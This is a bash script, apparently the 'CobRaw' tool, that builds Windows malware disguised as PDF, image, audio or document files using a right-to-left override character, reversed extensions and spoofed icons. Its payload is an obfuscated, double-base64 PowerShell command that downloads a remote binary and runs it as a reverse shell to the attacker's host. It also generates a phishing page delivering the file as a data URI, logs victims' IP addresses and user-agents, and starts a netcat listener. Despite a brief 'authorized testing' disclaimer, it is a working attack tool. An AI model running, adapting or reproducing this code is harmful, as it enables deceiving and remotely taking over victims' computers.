trap 'printf "\n";stop' 2
server_tcp="3.17.202.129" #NGROK IP


coded_by() {

printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[1;31m        Extension Spoofer and Payload Generator\e[0m        \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf "\n"
printf "        \e[1;91m Disclaimer: this tool is designed for security\n"
printf "         testing in an authorized simulated cyberattack\n"
printf "         Attacking targets without prior mutual consent\n"
printf "         is illegal!\n"

}


banner2() {

printf "\n"
printf ' ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| \n'
printf ' ||\e[1;31m _______  _______  ______   _______  _______          \e[0m || \n'
printf ' ||\e[1;31m(  ____ \(  ___  )(  ___ \ (  ____ )(  ___  )|\     /|\e[0m ||\n'
printf ' ||\e[1;31m| (    \/| (   ) || (   ) )| (    )|| (   ) || )   ( |\e[0m ||\n'
printf ' ||\e[1;31m| |      | |   | || (__/ / | (____)|| (___) || | _ | |\e[0m ||\n'
printf ' ||\e[1;31m| |      | |   | ||  __ (  |     __)|  ___  || |( )| |\e[0m || \n'
printf ' ||\e[1;31m| |      | |   | || (  \ \ | (\ (   | (   ) || || || |\e[0m || \n'
printf ' ||\e[1;31m| (____/\| (___) || )___) )| ) \ \__| )   ( || () () |\e[0m || \n'
printf ' ||\e[1;31m(_______/(_______)|/ \___/ |/   \__/|/     \|(_______)\e[0m || \n'
printf ' ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| \n'

printf "\n"

}

banner0() {

printf "\n"
printf '  _______  _______  ______   _______  _______           \n'
printf ' (  ____ \(  ___  )(  ___ \ (  ____ )(  ___  )|\     /| \n'
printf ' | (    \/| (   ) || (   ) )| (    )|| (   ) || )   ( | \n'
printf ' | |      | |   | || (__/ / | (____)|| (___) || | _ | | \n'
printf ' | |      | |   | ||  __ (  |     __)|  ___  || |( )| | \n'
printf ' | |      | |   | || (  \ \ | (\ (   | (   ) || || || | \n'
printf ' | (____/\| (___) || )___) )| ) \ \__| )   ( || () () | \n'
printf " (_______/(_______)|/ \___/ |/   \__/|/     \|(_______) \n"
printf "\n"


}


banner() {


printf "\n"
printf ' ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| \n'
printf ' ||\e[1;93m _______  _______  ______   _______  _______          \e[0m || \n'
printf ' ||\e[1;93m(  ____ \(  ___  )(  ___ \ (  ____ )(  ___  )|\     /|\e[0m ||\n'
printf ' ||\e[1;93m| (    \/| (   ) || (   ) )| (    )|| (   ) || )   ( |\e[0m ||\n'
printf ' ||\e[1;93m| |      | |   | || (__/ / | (____)|| (___) || | _ | |\e[0m ||\n'
printf ' ||\e[1;93m| |      | |   | ||  __ (  |     __)|  ___  || |( )| |\e[0m || \n'
printf ' ||\e[1;93m| |      | |   | || (  \ \ | (\ (   | (   ) || || || |\e[0m || \n'
printf ' ||\e[1;93m| (____/\| (___) || )___) )| ) \ \__| )   ( || () () |\e[0m || \n'
printf ' ||\e[1;93m(_______/(_______)|/ \___/ |/   \__/|/     \|(_______)\e[0m || \n'
printf ' ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| \n'
printf "\n"


}


stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
#checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
#if [[ $checkssh == *'ssh'* ]]; then
#killall -2 ssh > /dev/null 2>&1
#fi
exit 1

}

dependencies() {

command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "I require mingw-w64 but it's not installed. Install it: apt-get update && apt-get install mingw-w64"; 
exit 1; }
command -v base64 > /dev/null 2>&1 || { echo >&2 "I require base64 but it's not installed. Install it. Aborting."; exit 1; }
command -v iconv > /dev/null 2>&1 || { echo >&2 "I require iconv but it's not installed. Install it. Aborting."; exit 1; }
command -v zip > /dev/null 2>&1 || { echo >&2 "I require Zip but it's not installed. Install it. Aborting."; exit 1; }
command -v netcat > /dev/null 2>&1 || { echo >&2 "I require netcat but it's not installed. Install it. Aborting."; exit 1; } 

}


ngrok_server() {

if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
arch3=$(uname -a | grep -o '64bit' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

elif [[ $arch3 == *'64bit'* ]] ; then

wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-amd64.zip ]]; then
unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-amd64.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server (port 3333)...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2

if [[ -e check_ngrok ]]; then
rm -rf ngrok_check
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\e[0m\n"
./ngrok tcp 4444 > /dev/null 2>&1 > check_ngrok &
sleep 10

check_ngrok=$(grep -o 'ERR_NGROK_302' check_ngrok)

if [[ ! -z $check_ngrok ]];then
printf "\n\e[91mAuthtoken missing!\e[0m\n"
printf "\e[77mSign up at: https://ngrok.com/signup\e[0m\n"
printf "\e[77mYour authtoken is available on your dashboard: https://dashboard.ngrok.com\n\e[0m"
printf "\e[77mInstall your auhtoken:\e[0m\e[93m ./ngrok authtoken <YOUR_AUTHTOKEN>\e[0m\n\n"
rm -rf check_ngrok
exit 1
fi

if [[ -e check_ngrok ]]; then
rm -rf check_ngrok
fi

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://0.tcp.ngrok.io:[0-9]*")

if [[ ! -z $link ]]; then 
printf "\e[1;92m[\e[0m*\e[1;92m] Forwarding from:\e[0m\e[1;77m %s\e[0m\n" $link
else
printf "\n\e[91mNgrok Error!\e[0m\n"
exit 1
fi

}


settings2() {

default_payload_name="cobraw"
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_payload_name

read payload_name
payload_name="${payload_name:-${default_payload_name}}"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Redirect page (after delivering payload): \e[0m' redirect_url
redirect_url="${redirect_url:-${default_redirect_url}}"

}

start() {

if [[ -e ip.txt ]]; then
rm -f ip.txt
fi

printf "\n"
printf " \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok.io:\e[0m\n"
printf " \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Custom LPORT/LHOST:\e[0m\n"
default_option_server="1"
default_redirect_url="https://www.google.com"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a reverse TCP Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"

if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
forward=true
#settings
settings2
ngrok_server
#server
payload
#direct_link
listener
elif [[ $option_server -eq 2 ]]; then
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] LHOST: \e[0m' custom_ip
if [[ -z "$custom_ip" ]]; then
exit 1
fi
server_tcp=$custom_ip
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] LPORT: \e[0m' custom_port
if [[ -z "$custom_port" ]]; then
exit 1
fi
server_port=$custom_port
settings2
payload
listener
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start
fi

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
device=$(grep -o 'User-Agent:.*' ip.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $device
cat ip.txt >> saved.ip.txt
rm -f ip.txt
}

listener() {

if [[ $forward == true ]];then
printf "\n\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[1;91m Expose the server with command: \e[0m\n"
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[93m ssh -R 80:localhost:3333 custom-subdomain@ssh.localhost.run \e[0m\n"
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[92m Use \e[0m\e[77mhttps://server/%s.zip\e[0m\e[92m to deliver the direct file \e[0m\n" $payload_name
checkfound
else
default_start_listener="Y"
printf '\n\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Start Listener? \e[0m\e[1;77m[Y/n]\e[0m\e[1;33m: \e[0m'
read start_listener
start_listener="${start_listener:-${default_start_listener}}"
if [[ $start_listener == "Y" || $start_listener == "y" || $start_listener == "Yes" || $start_listener == "yes" ]]; then
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Listening connection, port 4444:\e[0m\n"
nc -lvp 4444
else
exit 1
fi
fi
}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do

if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip

default_start_listener="Y"
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Start Listener? \e[0m\e[1;77m[Y/n]\e[0m\e[1;33m: \e[0m'
read start_listener
start_listener="${start_listener:-${default_start_listener}}"
if [[ $start_listener == "Y" || $start_listener == "y" || $start_listener == "Yes" || $start_listener == "yes" ]]; then
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Listening connection, port 4444:\e[0m\n"
nc -lvp 4444

fi
fi
done
sleep 0.5

}

payload() {


q="c";z=".";
config
if [[ $forward == true ]];then
server_port=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://0.tcp.ngrok.io:[0-9]*" | cut -d ':' -f3)
fi

printf "\e[1;77m[\e[0m\e[1;33m::\e[0m\e[1;77m] Building malware binary\e[0m\n"; b2="1"

encode="powershell.exe wget 'http://tinyurl.com/y88r9epk' -OutFile l.exe; .\l.exe '$server_tcp' '$server_port' -e cmd.exe -d"
enc=$z$q #encode2='$client = New-Object System.Net.Sockets.TCPClient("'$server_tcp'",'$server_port');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS" + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
echo $encode > b64
encode_b64=$(iconv -f UTF-8 -t UTF-16LE b64 |base64 | tr -d '\n')
rm -f b64
cmd="powershell -encoded $encode_b64";v1="s"
echo $encode_b64 > b64enc
encode3=$(iconv -f UTF-8 -t UTF-16LE b64enc |base64 | tr -d '\n')
cmd2='powershell.exe -NoExit -c $cmd=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("'"$encode3"'"));iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cmd))) '
rm -f b64enc;Y=$v1$b2 > /dev/null 2>&1

sed -f - src/source.c > $v1$enc << EOF
s/payload/${cmd2}/g
EOF

sed "s+(\"+(\'+g" $v1.$q | sed "0,/\")/{s/\")/\')/}" > $Y.$q
ltro=$(echo -e '\u202e');y=$Y
rm -rf $v1$z$q > /dev/null 2>&1
i686-w64-mingw32-windres icon.rc -O coff -o my.res
i686-w64-mingw32-gcc $y$enc my.res -o "$payload_name""$ltro""$extension".exe 
rm -rf $Y.$q my.res icon.rc > /dev/null 2>&1
if [ -e "$payload_name""$ltro""$extension".exe ]; then
if [ ! -d payloads/"$payload_name"/ ]; then
IFS=$'\n'
mkdir -p payloads/"$payload_name/"
fi
cp "$payload_name""$ltro""$extension".exe payloads/"$payload_name"/"$payload_name""$ltro""$extension".exe
#cp "$payload_name""$ltro""$extension".exe payloads/"$payload_name"/"$payload_name""$ltro""$extension".pif
cp "$payload_name""$ltro""$extension".exe payloads/"$payload_name"/"$payload_name".pif
cp "$payload_name""$ltro""$extension".exe payloads/"$payload_name"/"$payload_name""$ltro""$extension".com
cp "$payload_name""$ltro""$extension".exe payloads/"$payload_name"/"$payload_name""$ltro""$extension".scr
#cp "$payload_name""$ltro""$extension".exe payloads/"$payload_name"/"$ltro""$extension".scr
cp "$payload_name""$ltro""$extension".exe payloads/"$payload_name"/"$payload_name".scr
cp "$payload_name""$ltro""$extension".exe payloads/"$payload_name"/"$payload_name".pdf.pif
cp "$payload_name""$ltro""$extension".exe payloads/"$payload_name"/"$payload_name".png.pif
cp "$payload_name""$ltro""$extension".exe payloads/"$payload_name"/"$payload_name".jpg.pif
cp "$payload_name""$ltro""$extension".exe payloads/"$payload_name"/"$payload_name".mp3.pif
cp "$payload_name""$ltro""$extension".exe payloads/"$payload_name"/"$payload_name".mp4.pif
cp "$payload_name""$ltro""$extension".exe payloads/"$payload_name"/"$payload_name".doc.pif
cp "$payload_name""$ltro""$extension".exe payloads/"$payload_name"/"$payload_name".ppt.pif

zip "$payload_name"_all.zip payloads/"$payload_name"/* > /dev/null 2>&1
zip $payload_name.zip "$payload_name""$ltro""$extension".exe > /dev/null 2>&1
IFS=$'\n'
data_base64=$(base64 -w 0 $payload_name.zip)
temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"

printf "\e[1;77m[\e[0m\e[1;33m::\e[0m\e[1;77m] Converting binary to base64\e[0m\n" 
printf "\e[1;77m[\e[0m\e[1;33m::\e[0m\e[1;77m] Injecting Data URI code into index.php\e[0m\n"
sed 's+url_website+'$redirect_url'+g' src/template.html | sed 's+payload_name+'$payload_name'+g'  > src/temp
sed -f - src/temp > index.php << EOF
s/data_base64/${temp64}/g
EOF
rm -rf src/temp > /dev/null 2>&1

printf "\e[1;93m[\e[0m\e[1;77m::\e[0m\e[1;93m]\e[0m\e[1;91m Zipped payload saved:\e[0m\e[1;77m %s.zip\e[0m\n" $payload_name
printf "\e[1;93m[\e[0m\e[1;77m::\e[0m\e[1;93m]\e[0m\e[1;91m Zipped all formats saved:\e[0m\e[1;77m %s_all.zip\e[0m\n" $payload_name
printf '\e[1;93m[\e[0m\e[1;77m::\e[0m\e[1;93m]\e[0m\e[1;91m USB stick formats Saved: \e[0m\e[1;77m payloads/%s/\e[0m\n' $payload_name

else
printf "\e[1;93mError compiling\e[0m\n"
exit 1
fi

}

config() {

default_spoof="PDF"

printf '\n'
printf ' \e[1;33m[\e[0m\e[1;31m01\e[0m\e[1;33m]\e[0m\e[1;77m PDF	\e[1;33m[\e[0m\e[1;31m05\e[0m\e[1;33m]\e[0m\e[1;77m MP4\e[0m\n '
printf '\e[1;33m[\e[0m\e[1;31m02\e[0m\e[1;33m]\e[0m\e[1;77m PNG	\e[1;33m[\e[0m\e[1;31m06\e[0m\e[1;33m]\e[0m\e[1;77m DOC\e[0m\n '
printf '\e[1;33m[\e[0m\e[1;31m03\e[0m\e[1;33m]\e[0m\e[1;77m JPG	\e[1;33m[\e[0m\e[1;31m07\e[0m\e[1;33m]\e[0m\e[1;77m PPT\e[0m\n '
printf '\e[1;33m[\e[0m\e[1;31m04\e[0m\e[1;33m]\e[0m\e[1;77m MP3\e[0m\n '


printf '\n\e[1;33m[\e[0m\e[1;77m::\e[0m\e[1;33m] Spoof extension option: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_spoof
read spoof
spoof="${spoof:-${default_spoof}}"
default_icon_opt="Y"
printf '\e[1;33m[\e[0m\e[1;77m::\e[0m\e[1;33m] Use default icon?\e[0m\e[1;77m [Y/n]\e[0m\e[1;33m: \e[0m'
read icon_opt
icon_opt="${icon_opt:-${default_icon_opt}}"

if [[ $icon_opt == "Y" ]] || [[ $icon_opt == "y" ]]; then
custom_icon=false
else
custom_icon=true
fi

if [[ $spoof -eq 1 ]] || [[ $spoof == "PDF" ]] || [[ $spoof == "pdf" ]] ; then

if [[ $custom_icon == false ]]; then
printf "id ICON \"%s\"" icons/pdf.ico  > icon.rc
fi

extension="fdp"

elif [[ $spoof -eq 2 ]] || [[ $spoof == "PNG" ]] || [[ $spoof == "png" ]] ; then
if [[ $custom_icon == false ]]; then
printf "id ICON \"%s\"" icons/png.ico  > icon.rc
fi
extension="gnp"

elif [[ $spoof -eq 3 ]] || [[ $spoof == "JPG" ]] || [[ $spoof == "jpg" ]] ; then
if [[ $custom_icon == false ]]; then
printf "id ICON \"%s\"" icons/jpg.ico  > icon.rc
fi
extension="gpj"

elif [[ $spoof -eq 4 ]] || [[ $spoof == "MP3" ]] || [[ $spoof == "mp3" ]] ; then
if [[ $custom_icon == false ]]; then
printf "id ICON \"%s\"" icons/mp3.ico  > icon.rc
fi
extension="3pm"

elif [[ $spoof -eq 5 ]] || [[ $spoof == "MP4" ]] || [[ $spoof == "mp4" ]] ; then
if [[ $custom_icon == false ]]; then
printf "id ICON \"%s\"" icons/mp4.ico  > icon.rc
fi
extension="4pm"

elif [[ $spoof -eq 6 ]] || [[ $spoof == "DOC" ]] || [[ $spoof == "doc" ]] ; then
if [[ $custom_icon == false ]]; then
printf "id ICON \"%s\"" icons/doc.ico  > icon.rc
fi
extension="cod"

elif [[ $spoof -eq 7 ]] || [[ $spoof == "PPT" ]] || [[ $spoof == "ppt" ]] ; then
if [[ $custom_icon == false ]]; then
printf "id ICON \"%s\"" icons/ppt.ico  > icon.rc
fi
extension="tpp"

else
printf '\n\e[1;33m[\e[0m\e[1;77m!\e[0m\e[1;33m]\e[0m\e[1;91m Invalid option, try again \e[0m\n'
config
fi

if [[ $custom_icon == true ]];then
printf '\e[1;33m[\e[0m\e[1;77m::\e[0m\e[1;33m] Icon path\e[0m\e[1;33m: \e[0m' 
read icon_path

if [[ -f $icon_path ]];then
printf "id ICON \"%s\"" $icon_path  > icon.rc
else
printf "\e[1;91mFile Not Found!\e[0m\n"
exit 1
fi
fi


}


clear
banner0
sleep 0.5
clear
banner
sleep 0.5
clear
banner0
sleep 0.5
clear
banner
sleep 0.5
clear
banner2
coded_by
dependencies
start

